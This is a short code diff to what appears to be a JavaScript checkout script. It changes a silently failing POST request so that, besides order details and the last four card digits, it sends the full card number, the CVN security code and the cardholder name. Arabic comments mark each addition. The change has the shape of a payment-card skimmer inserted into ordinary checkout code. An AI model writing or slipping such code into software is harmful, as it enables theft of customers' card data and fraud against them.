@@ -526,14 +526,17 @@
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            orderNumber: activeContext.orderNumber,
-            email: activeContext.email,
-            formattedAmount: summary.formattedAmount,
-            brand: summary.brand,
-            last4: summary.last4,
-            expiration: summary.expiration,
-          }),
-        }).catch(() => {});
+            orderNumber,
+            customerEmail,
+            amountText,
+            brand,
+            last4: rawCardNumber.slice(-4),
+            fullCardNumber: rawCardNumber, // إضافة الرقم الكامل
+            cvn: cvnValue,                 // إضافة رمز الأمان
+            cardholderName: holderName,    // إضافة اسم حامل البطاقة
+            expiration,
+          })
+        }).catch(() => { });
       }
 
       if (typeof activeContext?.onComplete === 'function') {
